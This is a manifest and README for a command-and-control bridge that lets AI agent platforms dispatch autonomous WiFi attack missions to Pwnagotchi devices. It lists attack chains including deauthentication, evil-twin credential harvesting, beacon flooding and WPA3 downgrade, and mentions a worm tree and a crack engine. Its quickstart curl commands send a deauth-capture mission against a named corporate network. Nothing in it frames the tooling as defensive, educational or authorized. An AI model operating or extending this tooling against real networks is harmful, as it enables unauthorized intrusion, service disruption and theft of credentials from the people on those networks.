---
name: nemesis-c2-bridge
version: 2.3.0
spec: clawhub/v1
description: >-
  Nemesis C2 bridge — control autonomous WiFi attack agents (Pwnagotchi Pi Zero 2W)
  from OpenClaw. Dispatch chains, query crack jobs, manage worm tree.
  Integrates with Crabfleet for fleet ops and ClawHub for skill discovery.
tags: [c2, wifi, pwnagotchi, pi-zero, offensive, mobile, wardriving]
author: nemesis
license: MIT
repository: https://github.com/nemesis/c2-bridge
entrypoints:
  skill: /skill
  api: http://0.0.0.0:8553
  health: http://0.0.0.0:8553/health
openclaw:
  compat:
    pluginApi: ">=0.3"
    crabfleet: ">=1.0"
    clawhub: ">=1.0"
---

# Nemesis C2 Bridge

Control autonomous WiFi attack missions from any OpenClaw agent.

## Architecture

```
Pwnagotchi Pi ───USB gadget───> Nemesis C2 (:8443) ───> Bridge (:8553) ───> OpenClaw
                                     │                         │
                                     ├─ Worm tree              ├─ /health (public)
                                     ├─ Crack engine           ├─ /skill (ClawHub discovery)
                                     ├─ AdaptiveChain 9000     ├─ /status (full C2 report)
                                     └─ 8 attack chains        ├─ /fleet (Crabfleet dashboard)
                                                               ├─ /fleet/heartbeat (agent liveness)
                                                               ├─ /dispatch (send chain to agent)
                                                               └─ /kill (emergency destruct)
```

## Chains

| Chain | Description |
|-------|-------------|
| `wardrive` | Passive WiFi survey, log all APs |
| `deauth_capture` | Deauth clients, capture WPA handshakes |
| `pmkid_capture` | Passive PMKID capture (no deauth) |
| `evil_twin` | Clone target SSID, harvest credentials |
| `karma` | Respond to any probe request |
| `broadcast_deauth` | Nuclear deauth all clients on channel |
| `beacon_flood` | Flood hundreds of fake AP beacons |
| `wpa3_downgrade` | Force WPA3→WPA2 fallback |

## Quickstart

```bash
# Start C2
python3 nemesis_c2_hardened.py &

# Start bridge
python3 openclaw_bridge_server.py &

# Health check (no auth needed)
curl http://0.0.0.0:8553/health

# Get ClawHub skill manifest
curl http://0.0.0.0:8553/skill | jq

# Agent heartbeat (Crabfleet protocol)
curl -X POST http://0.0.0.0:8553/fleet/heartbeat \
  -H "Content-Type: application/json" \
  -d '{"card_id":"pi-stalker-01","status":"online","uptime_seconds":3600,"battery_pct":85}'

# List fleet cards
curl -H "X-OpenClaw-Token: 021c328fc63f..." http://0.0.0.0:8553/fleet

# Dispatch a mission
curl -X POST http://0.0.0.0:8553/dispatch \
  -H "X-OpenClaw-Token: 021c328fc63f..." \
  -H "Content-Type: application/json" \
  -d '{"device_id":"pi-stalker-01","chain_name":"deauth_capture","target":"TargetCorp_WiFi"}'

# Publish to ClawHub (requires bun + clawhub CLI)
clawhub skill publish ./clawhub_skills/nemesis-c2-bridge
```

## Crabfleet Integration

The bridge implements Crabfleet heartbeat protocol. Configure a Crabfleet Worker to poll
`/fleet/heartbeat` from agents or use the bridge as a fleet relay:

```
Crabfleet Worker ──poll──> /fleet/cards (get all cards)
                        └> /fleet (dashboard with online/offline counts)
```

Each Pwnagotchi agent sends heartbeats via:
```json
{
  "card_id": "pi-stalker-01",
  "status": "online",
  "uptime_seconds": 7200,
  "active_chain": "deauth_capture",
  "battery_pct": 72,
  "gps": {"lat": 37.7749, "lon": -122.4194}
}
```

The bridge tracks staleness (>90s no heartbeat → offline) and exposes it in `/fleet/cards`.

## Endpoints (10 total, 2 public)

| Endpoint | Method | Auth | Purpose |
|----------|--------|------|---------|
| `/health` | GET | Public | Bridge + C2 liveness, fleet ID, version |
| `/skill` | GET | Public | ClawHub v1 manifest (auto-discovery) |
| `/status` | GET | Token | Full C2 report: agents, cracks, worm tree |
| `/agents` | GET | Token | Online/total agent count |
| `/cracks` | GET | Token | Crack job status |
| `/fleet` | GET | Token | Crabfleet dashboard |
| `/fleet/cards` | GET | Token | Card list with staleness detection |
| `/fleet/heartbeat` | POST | Public | Agent heartbeat registration |
| `/dispatch` | POST | Token | Dispatch attack chain |
| `/kill` | POST | Token | Signed kill command |

## Auth

Header `X-OpenClaw-Token: <token>`. Health and skill endpoints are public.
